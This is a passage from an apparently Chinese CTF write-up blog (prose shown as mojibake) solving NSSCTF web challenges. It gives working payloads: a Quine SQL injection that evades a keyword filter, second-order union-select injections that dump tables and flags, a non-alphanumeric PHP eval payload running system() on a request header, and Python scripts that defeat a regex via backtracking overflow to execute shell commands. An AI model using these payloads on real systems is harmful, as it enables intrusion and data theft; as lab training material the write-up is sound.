class="line">            flag+=j</span><br><span class="line">            <span class="built_in">print</span>(flag)</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="built_in">print</span>(flag)</span><br><span class="line">        <span class="keyword">break</span></span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">b2f2d15b3ae082ca29697d8dcd420fd7</span><br></pre></td></tr></table></figure>

<p>ç™»é™†æˆåŠŸåæºç å¦‚ä¸‹ï¼š</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><span class="line"> <span class="meta">&lt;?php</span></span><br><span class="line"><span class="comment">//å¤šåŠ äº†äº¿ç‚¹ç‚¹è¿‡æ»¤</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">include_once</span>(<span class="string">&quot;config.php&quot;</span>);</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">alertMes</span>(<span class="params"><span class="variable">$mes</span>,<span class="variable">$url</span></span>)</span>&#123;</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">&quot;&lt;script&gt;alert(&#x27;<span class="subst">&#123;$mes&#125;</span>&#x27;);location.href=&#x27;<span class="subst">&#123;$url&#125;</span>&#x27;;&lt;/script&gt;&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">checkSql</span>(<span class="params"><span class="variable">$s</span></span>) </span>&#123;</span><br><span class="line">    <span class="keyword">if</span>(<span class="title function_ invoke__">preg_match</span>(<span class="string">&quot;/if|regexp|between|in|flag|=|&gt;|&lt;|and|\||right|left|insert|database|reverse|update|extractvalue|floor|join|substr|&amp;|;|\\\$|char|\x0a|\x09|column|sleep|\ /i&quot;</span>,<span class="variable">$s</span>))&#123;</span><br><span class="line">        <span class="title function_ invoke__">alertMes</span>(<span class="string">&#x27;waf here&#x27;</span>, <span class="string">&#x27;index.php&#x27;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;username&#x27;</span>]) &amp;&amp; <span class="variable">$_POST</span>[<span class="string">&#x27;username&#x27;</span>] != <span class="string">&#x27;&#x27;</span> &amp;&amp; <span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;passwd&#x27;</span>]) &amp;&amp; <span class="variable">$_POST</span>[<span class="string">&#x27;passwd&#x27;</span>] != <span class="string">&#x27;&#x27;</span>) &#123;</span><br><span class="line">    <span class="variable">$username</span>=<span class="variable">$_POST</span>[<span class="string">&#x27;username&#x27;</span>];</span><br><span class="line">    <span class="variable">$password</span>=<span class="variable">$_POST</span>[<span class="string">&#x27;passwd&#x27;</span>];</span><br><span class="line">    <span class="keyword">if</span> (<span class="variable">$username</span> !== <span class="string">&#x27;bilala&#x27;</span>) &#123;</span><br><span class="line">        <span class="title function_ invoke__">alertMes</span>(<span class="string">&#x27;only bilala can login&#x27;</span>, <span class="string">&#x27;index.php&#x27;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="title function_ invoke__">checkSql</span>(<span class="variable">$password</span>);</span><br><span class="line">    <span class="variable">$sql</span>=<span class="string">&quot;SELECT passwd FROM users WHERE username=&#x27;bilala&#x27; and passwd=&#x27;<span class="subst">$password</span>&#x27;;&quot;</span>;</span><br><span class="line">    <span class="variable">$user_result</span>=<span class="title function_ invoke__">mysqli_query</span>(<span class="variable">$MysqlLink</span>,<span class="variable">$sql</span>);</span><br><span class="line">    <span class="variable">$row</span> = <span class="title function_ invoke__">mysqli_fetch_array</span>(<span class="variable">$user_result</span>);</span><br><span class="line">    <span class="keyword">if</span> (!<span class="variable">$row</span>) &#123;</span><br><span class="line">        <span class="title function_ invoke__">alertMes</span>(<span class="string">&#x27;nothing found&#x27;</span>,<span class="string">&#x27;index.php&#x27;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> (<span class="variable">$row</span>[<span class="string">&#x27;passwd&#x27;</span>] === <span class="variable">$password</span>) &#123;</span><br><span class="line">        <span class="keyword">if</span>(<span class="variable">$password</span> == <span class="string">&#x27;b2f2d15b3ae082ca29697d8dcd420fd7&#x27;</span>)&#123;</span><br><span class="line">            <span class="title function_ invoke__">show_source</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line">            <span class="keyword">die</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span>&#123;</span><br><span class="line">            <span class="keyword">die</span>(<span class="variable">$FLAG</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="title function_ invoke__">alertMes</span>(<span class="string">&quot;wrong password&quot;</span>,<span class="string">&#x27;index.php&#x27;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p>é‡ç‚¹åœ¨æ­¤å¤„ï¼š</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (<span class="variable">$row</span>[<span class="string">&#x27;passwd&#x27;</span>] === <span class="variable">$password</span>) &#123;</span><br><span class="line">        <span class="keyword">if</span>(<span class="variable">$password</span> == <span class="string">&#x27;b2f2d15b3ae082ca29697d8dcd420fd7&#x27;</span>)&#123;</span><br><span class="line">            <span class="title function_ invoke__">show_source</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line">            <span class="keyword">die</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span>&#123;</span><br><span class="line">            <span class="keyword">die</span>(<span class="variable">$FLAG</span>);</span><br><span class="line">        &#125;</span><br></pre></td></tr></table></figure>

<p>è€ƒç‚¹ä¸ºsqlæ³¨å…¥ä¹‹Quineæ³¨å…¥</p>
<p><strong>è¿™é‡Œå…ˆä»‹ç»ä¸€ä¸‹Quineæ³¨å…¥ï¼š</strong></p>
<p><a target="_blank" rel="noopener" href="https://nakaii.top/2023/04/24/%E8%AE%B0%E4%B8%80%E6%AC%A1Quino%E6%B3%A8%E5%85%A5%E5%AD%A6%E4%B9%A0/index.html">https://nakaii.top/2023/04/24/%E8%AE%B0%E4%B8%80%E6%AC%A1Quino%E6%B3%A8%E5%85%A5%E5%AD%A6%E4%B9%A0/index.html</a></p>
<p>Quineåˆç§°ä¸ºè‡ªäº§ç”Ÿç¨‹åºï¼Œåœ¨sqlæ³¨å…¥ä¸­æ˜¯ä¸€ç§ä½¿å¾—è¾“å…¥çš„sqlè¯­å¥å’Œè¾“å‡ºçš„sqlè¯­å¥ä¸€è‡´çš„æŠ€æœ¯ï¼Œå°±æ˜¯è¯´è¾“å…¥çš„è¯­å¥è¿›è¡ŒæŸ¥è¯¢åç”Ÿæˆçš„ç»“æœä¸è¾“å…¥çš„è¯­å¥ç›¸åŒï¼ˆè‡ªå·±ç”Ÿæˆè‡ªå·±ï¼‰ï¼Œå¯ä»¥çœ‹åˆ°é¢˜ç›®ä¸­çš„åˆ¤æ–­æ­£æ˜¯è€ƒå¯Ÿäº†è¿™ä¸ªç‚¹ã€‚</p>
<p>çªç ´å£æ˜¯replaceå‡½æ•°</p>
<blockquote>
<p>replace(object, search, replace)</p>
</blockquote>
<p>æ­¤å‡½æ•°ç”¨äºå°†objectä¸­çš„æ‰€æœ‰searchæ›¿æ¢ä¸ºreplaceã€‚</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">MariaDB [(none)]&gt; select replace(&quot;.&quot;, char(46), &quot;!&quot;);</span><br><span class="line">+-----------------------------+</span><br><span class="line">| replace(&quot;.&quot;, char(46), &quot;!&quot;) |</span><br><span class="line">+-----------------------------+</span><br><span class="line">| !                           |</span><br><span class="line">+-----------------------------+</span><br><span class="line">1 row in set (0.000 sec)</span><br></pre></td></tr></table></figure>

<p><strong>å°è¯•ä½¿è¾“å…¥è¾“å‡ºä¿æŒä¸€è‡´ï¼</strong></p>
<p><strong>æ›¿æ¢object</strong></p>
<p>å°è¯•é€šè¿‡æ›¿æ¢objectä½¿è¾“å…¥è¾“å‡ºä¿æŒä¸€è‡´:</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">MariaDB [(none)]&gt; select replace(&#x27;replace(&quot;.&quot;,char(46),&quot;.&quot;)&#x27;,char(46),&#x27;.&#x27;);</span><br><span class="line">+---------------------------------------------------+</span><br><span class="line">| replace(&#x27;replace(&quot;.&quot;,char(46),&quot;.&quot;)&#x27;,char(46),&#x27;.&#x27;) |</span><br><span class="line">+---------------------------------------------------+</span><br><span class="line">| replace(&quot;.&quot;,char(46),&quot;.&quot;)                         |</span><br><span class="line">+---------------------------------------------------+</span><br><span class="line">1 row in set (0.000 sec)</span><br></pre></td></tr></table></figure>

<p>è¿˜æ˜¯å·®ä¸€ç‚¹ï¼Œåªæ˜¯å°†objectä¸­çš„å­—ç¬¦ä¸²åŸæ ·è¾“å‡ºäº†ï¼Œreplaceè¿˜æ²¡æ€ä¹ˆç”¨åˆ°ï¼Œæ˜¯å¦å¯ä»¥é€šè¿‡æ›´æ”¹replaceä½¿è¾“å…¥è¾“å‡ºä¿æŒä¸€è‡´ï¼Ÿ</p>
<p><strong>æ›¿æ¢object+replace</strong></p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">MariaDB [(none)]&gt; select replace(&#x27;replace(&quot;.&quot;,char(46),&quot;.&quot;)&#x27;,char(46),&#x27;replace(&quot;.&quot;,char(46),&quot;.&quot;)&#x27;);</span><br><span class="line">+---------------------------------------------------------------------------+</span><br><span class="line">| replace(&#x27;replace(&quot;.&quot;,char(46),&quot;.&quot;)&#x27;,char(46),&#x27;replace(&quot;.&quot;,char(46),&quot;.&quot;)&#x27;) |</span><br><span class="line">+---------------------------------------------------------------------------+</span><br><span class="line">| replace(&quot;replace(&quot;.&quot;,char(46),&quot;.&quot;)&quot;,char(46),&quot;replace(&quot;.&quot;,char(46),&quot;.&quot;)&quot;) |</span><br><span class="line">+---------------------------------------------------------------------------+</span><br><span class="line">1 row in set (0.000 sec)</span><br></pre></td></tr></table></figure>

<p>å¯ä»¥çœ‹åˆ°ç¡®å®é•¿å¾—å·®ä¸å¤šäº†ï¼Œä½†è¿˜æ˜¯æœ‰é—®é¢˜ï¼ŒåŒ…å›´objectå’Œreplaceçš„ç¬¦å·ä»ç„¶æœ‰å·®å¼‚ã€‚objectä¸­çš„.è¢«æ›¿æ¢ä¸ºäº†replace(â€œ.â€,char(46),â€.â€),ä½†åŒ…å›´.çš„å¼•å·ä¸ºåŒå¼•å·ï¼Œå¦‚æœç›´æ¥æ›´æ”¹ä¸ºå•å¼•å·ä¼šé€ æˆæœ€å¤–å±‚replaceçš„objectç•Œé™ä¸æ˜ç¡®ï¼Œå› æ­¤è¿˜éœ€è¦å†å¥—ä¸€å±‚replaceï¼Œå°†åŒå¼•å·æ”¹ä¸ºå•å¼•å·ã€‚</p>
<p><strong>è§£å†³å¼•å·é—®é¢˜</strong></p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">replace(&#x27;&quot;.&quot;&#x27;,char(34),char(39))</span><br></pre></td></tr></table></figure>

<p>è¯­å¥å°†å­—ç¬¦ä¸²ä¸­çš„åŒå¼•å·æ›¿æ¢ä¸ºäº†å•å¼•å·ï¼Œè¿™å°±æ˜¯è§£å†³å¼•å·é—®é¢˜çš„æ–¹æ³•ï¼Œå³åœ¨objectå¤–å†å¥—ä¸€å±‚replaceå°†é‡Œé¢çš„åŒå¼•å·æ›´æ”¹ä¸ºå•å¼•å·ï¼š</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">MariaDB [(none)]&gt; select replace(replace(&#x27;replace(replace(&quot;.&quot;,char(34),char(39)),char(46),&quot;.&quot;)&#x27;,char(34),char(39)),char(46),&#x27;replace(replace(&quot;.&quot;,char(34),char(39)),char(46),&quot;.&quot;)&#x27;);</span><br><span class="line">+------------------------------------------------------------------------------------------------------------------------------------------------------------+</span><br><span class="line">| replace(replace(&#x27;replace(replace(&quot;.&quot;,char(34),char(39)),char(46),&quot;.&quot;)&#x27;,char(34),char(39)),char(46),&#x27;replace(replace(&quot;.&quot;,char(34),char(39)),char(46),&quot;.&quot;)&#x27;) |</span><br><span class="line">+------------------------------------------------------------------------------------------------------------------------------------------------------------+</span><br><span class="line">| replace(replace(&#x27;replace(replace(&quot;.&quot;,char(34),char(39)),char(46),&quot;.&quot;)&#x27;,char(34),char(39)),char(46),&#x27;replace(replace(&quot;.&quot;,char(34),char(39)),char(46),&quot;.&quot;)&#x27;) |</span><br><span class="line">+------------------------------------------------------------------------------------------------------------------------------------------------------------+</span><br><span class="line">1 row in set (0.000 sec)</span><br></pre></td></tr></table></figure>



<p><strong>æ€»ç»“</strong></p>
<p>QuineåŸºæœ¬å½¢å¼ï¼š</p>
<blockquote>
<p> replace(replace(â€˜strâ€™,char(34),char(39)),char(46),â€˜strâ€™)</p>
</blockquote>
<p>å…ˆå°†stré‡Œçš„åŒå¼•å·æ›¿æ¢æˆå•å¼•å·ï¼Œå†ç”¨stræ›¿æ¢stré‡Œçš„.</p>
<p>stråŸºæœ¬å½¢å¼ï¼ˆå¯ä»¥ç†è§£æˆä¸Šé¢çš„â€.â€ï¼‰ï¼š</p>
<blockquote>
<p> replace(replace(â€œ.â€,char(34),char(39)),char(46),â€.â€)</p>
</blockquote>
<p>å®Œæ•´çš„Quineå°±æ˜¯<em><strong>QuineåŸºæœ¬å½¢å¼+stråŸºæœ¬å½¢å¼</strong></em></p>
<p>è¿™æ—¶æˆ‘ä»¬å†å›å¤´çœ‹é¢˜ç›®</p>
<p>stråŸºæœ¬å½¢å¼ä¸º</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&quot;/**/union/**/select/**/replace(replace(&quot;.&quot;,char(34),char(39)),char(46),&quot;.&quot;)#</span><br></pre></td></tr></table></figure>

<p>quineåŸºæœ¬å½¢å¼ä¸º</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#x27;/**/union/**/select/**/replace(replace(&#x27;str&#x27;,char(34),char(39)),char(46),&#x27;str&#x27;)#</span><br></pre></td></tr></table></figure>

<p>æ€»ä½“ä¸º</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#x27;/**/union/**/select/**/replace(replace(&#x27;&quot;/**/union/**/select/**/replace(replace(&quot;.&quot;,char(34),char(39)),char(46),&quot;.&quot;)#&#x27;,char(34),char(39)),char(46),&#x27;&quot;/**/union/**/select/**/replace(replace(&quot;.&quot;,char(34),char(39)),char(46),&quot;.&quot;)#&#x27;)#</span><br></pre></td></tr></table></figure>

<p>ä½†æ˜¯æ­¤å¤„charè¢«è¿‡æ»¤ï¼Œé‚£ä¹ˆç”¨chrä¹Ÿè¡Œ</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#x27;/**/union/**/select/**/replace(replace(&#x27;&quot;/**/union/**/select/**/replace(replace(&quot;.&quot;,chr(34),chr(39)),chr(46),&quot;.&quot;)#&#x27;,chr(34),chr(39)),chr(46),&#x27;&quot;/**/union/**/select/**/replace(replace(&quot;.&quot;,chr(34),chr(39)),chr(46),&quot;.&quot;)#&#x27;)#</span><br></pre></td></tr></table></figure>

<p><img src="C:\Users\TY\AppData\Roaming\Typora\typora-user-images\image-20241201162019665.png" alt="image-20241201162019665"></p>
<p>NSSCTF{23e578bc-4904-467f-8c73-544bccadb796}</p>
<h2 id="October-2019-Twice-SQL-Injection"><a href="#October-2019-Twice-SQL-Injection" class="headerlink" title="[October 2019]Twice SQL Injection"></a>[October 2019]Twice SQL Injection</h2><p>æ ‡é¢˜ç›´è¯´äº†ï¼ŒäºŒæ¬¡æ³¨å…¥</p>
<p><img src="C:\Users\TY\AppData\Roaming\Typora\typora-user-images\image-20241201162431475.png" alt="image-20241201162431475"></p>
<p>å­˜åœ¨ç™»é™†æ³¨å†Œç•Œé¢ï¼Œå¯èƒ½å°±æ˜¯é€šè¿‡æ³¨å†Œï¼Œå°†æ¶æ„sqlå­˜å…¥æ•°æ®åº“ï¼Œç™»é™†æ—¶å°†usernameä»£å…¥selectè¯­å¥ä»è€Œå¯¼è‡´äº†äºŒæ¬¡æ³¨å…¥</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">1&#x27; union select database()#</span><br></pre></td></tr></table></figure>

<p>ä»¥ä¸Špayloadä½¿ç™»é™†åé¡µé¢å›æ˜¾ctftraining</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">1&#x27; union select (select group_concat(table_name) from information_schema.tables where table_schema=database())#</span><br></pre></td></tr></table></figure>

<img src="C:\Users\TY\AppData\Roaming\Typora\typora-user-images\image-20241201162925243.png" alt="image-20241201162925243" style="zoom:67%;" />

<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">1&#x27; union select (select group_concat(column_name) from information_schema.columns where table_name=&#x27;flag&#x27;)#</span><br></pre></td></tr></table></figure>

<img src="C:\Users\TY\AppData\Roaming\Typora\typora-user-images\image-20241201163048605.png" alt="image-20241201163048605" style="zoom:67%;" />

<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">1&#x27; union select (select group_concat(flag) from flag)#</span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">NSSCTF&#123;1f52dc37-5280-432e-8935-ed7a31f848a0&#125;</span><br></pre></td></tr></table></figure>



<h2 id="é¹åŸæ¯-2022-ç®€å•çš„php"><a href="#é¹åŸæ¯-2022-ç®€å•çš„php" class="headerlink" title="[é¹åŸæ¯ 2022]ç®€å•çš„php"></a>[é¹åŸæ¯ 2022]ç®€å•çš„php</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">show_source</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line">    <span class="variable">$code</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;code&#x27;</span>];</span><br><span class="line">    <span class="keyword">if</span>(<span class="title function_ invoke__">strlen</span>(<span class="variable">$code</span>) &gt; <span class="number">80</span> <span class="keyword">or</span> <span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/[A-Za-z0-9]|\&#x27;|&quot;|`|\ |,|\.|-|\+|=|\/|\\|&lt;|&gt;|\$|\?|\^|&amp;|\|/is&#x27;</span>,<span class="variable">$code</span>))&#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&#x27; Hello&#x27;</span>);</span><br><span class="line">    &#125;<span class="keyword">else</span> <span class="keyword">if</span>(<span class="string">&#x27;;&#x27;</span> === <span class="title function_ invoke__">preg_replace</span>(<span class="string">&#x27;/[^\s\(\)]+?\((?R)?\)/&#x27;</span>, <span class="string">&#x27;&#x27;</span>, <span class="variable">$code</span>))&#123;</span><br><span class="line">        @<span class="keyword">eval</span>(<span class="variable">$code</span>);</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span> </span><br></pre></td></tr></table></figure>

<p>æ— å­—æ¯å­—æ¯rceå’Œæ— å‚rceçš„ç»“åˆç‰ˆ</p>
<p>çœ‹è¿‡æ»¤ï¼Œç›´æ¥ç”¨å–åå°±å¯ä»¥</p>
<p>æœ€ç»ˆæƒ³è¦æ„é€ çš„æ˜¯</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">system(end(getallheaders()));</span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">[~%8C%86%8C%8B%9A%92][!%FF]([~%9A%91%9B][!%FF]([~%98%9A%8B%9E%93%93%97%9A%9E%9B%9A%8D%8C][!%FF]()));</span><br></pre></td></tr></table></figure>

<p> ç„¶åç”¨äºŒç»´æ•°ç»„è¿›è¡Œæ‹¼æ¥å¿…é¡»æœ‰[!%FFè¿›è¡Œåˆ†å‰²]</p>
<img src="C:\Users\TY\AppData\Roaming\Typora\typora-user-images\image-20241201165516664.png" alt="image-20241201165516664" style="zoom:67%;" />

<p>NSSCTF{8eb0d6fc-55b1-4d5b-90bc-5140b5565b6b}</p>
<h2 id="NISACTF-2022-middlerce"><a href="#NISACTF-2022-middlerce" class="headerlink" title="[NISACTF 2022]middlerce"></a>[NISACTF 2022]middlerce</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">include</span> <span class="string">&quot;check.php&quot;</span>;</span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$_REQUEST</span>[<span class="string">&#x27;letter&#x27;</span>]))&#123;</span><br><span class="line">    <span class="variable">$txw4ever</span> = <span class="variable">$_REQUEST</span>[<span class="string">&#x27;letter&#x27;</span>];</span><br><span class="line">    <span class="keyword">if</span> (<span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/^.*([\w]|\^|\*|\(|\~|\`|\?|\/| |\||\&amp;|!|\&lt;|\&gt;|\&#123;|\x09|\x0a|\[).*$/m&#x27;</span>,<span class="variable">$txw4ever</span>))&#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&quot;å†åŠ æŠŠæ²¹å–”&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="variable">$command</span> = <span class="title function_ invoke__">json_decode</span>(<span class="variable">$txw4ever</span>,<span class="literal">true</span>)[<span class="string">&#x27;cmd&#x27;</span>];</span><br><span class="line">        <span class="title function_ invoke__">checkdata</span>(<span class="variable">$command</span>);</span><br><span class="line">        @<span class="keyword">eval</span>(<span class="variable">$command</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p>åªéœ€ç»•è¿‡preg_matchåé¢å°±ç®€å•äº†ï¼Œpregå›æº¯æ¬¡æ•°ç»•è¿‡ï¼Œå¤§äº1000000å­—ç¬¦å°±å¯ä»¥å•¦ç®€å•</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line">url=<span class="string">&#x27;http://node4.anna.nssctf.cn:28728/&#x27;</span></span><br><span class="line"></span><br><span class="line">payload=<span class="string">&#x27;&#123;&quot;cmd&quot;:&quot;eeeee&quot;,&quot;aaa&quot;:&quot;&#x27;</span>+<span class="string">&quot;$&quot;</span>*<span class="number">1000000</span>+<span class="string">&#x27;&quot;&#125;&#x27;</span></span><br><span class="line"><span class="built_in">print</span>(payload)</span><br><span class="line"></span><br><span class="line">res=requests.post(url,data=&#123;<span class="string">&quot;letter&quot;</span>:payload&#125;)</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(res.text)</span><br></pre></td></tr></table></figure>

<p><img src="C:\Users\TY\AppData\Roaming\Typora\typora-user-images\image-20241201195030922.png" alt="image-20241201195030922"></p>
<p>å›æ˜¾ä¸å†æ˜¯å†åŠ æŠŠæ²¹å–”ï¼Œé‚£ä¹ˆå°±æˆåŠŸäº†ï¼Œæ¥ä¸‹æ¥æˆ‘ä»¬éœ€è¦ç»•è¿‡çš„å°±æ˜¯checkdataå‡½æ•°ï¼</p>
<p>evalçš„è¯å¯ä»¥çŸ­æ ‡ç­¾+åå¼•å·</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line">url=<span class="string">&#x27;http://node4.anna.nssctf.cn:28728/&#x27;</span></span><br><span class="line"></span><br><span class="line">payload=<span class="string">&#x27;&#123;&quot;cmd&quot;:&quot;?&gt;&lt;?=`ls /`?&gt;&quot;,&quot;aaa&quot;:&quot;&#x27;</span>+<span class="string">&quot;$&quot;</span>*<span class="number">1000000</span>+<span class="string">&#x27;&quot;&#125;&#x27;</span></span><br><span class="line"><span class="built_in">print</span>(payload)</span><br><span class="line"></span><br><span class="line">res=requests.post(url,data=&#123;<span class="string">&quot;letter&quot;</span>:payload&#125;)</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(res.text)</span><br></pre></td></tr></table></figure>

<p>æ ¹ç›®å½•å‘ç°&#x2F;flagï¼Œé‚£ä¹ˆå°±æ‹¿æäº†å•Š</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nl /f*</span><br></pre></td></tr></table></figure>

<p><img src="C:\Users\TY\AppData\Roaming\Typora\typora-user-images\image-20241201195811853.png" alt="image-20241201195811853"></p>
<h2 id="CISCN-2023-ååŒ—-ez-date"><a href="#CISCN-2023-ååŒ—-ez-date" class="headerlink" title="[CISCN 2023 ååŒ—]ez_date"></a>[CISCN 2023 ååŒ—]ez_date</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"> <span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span 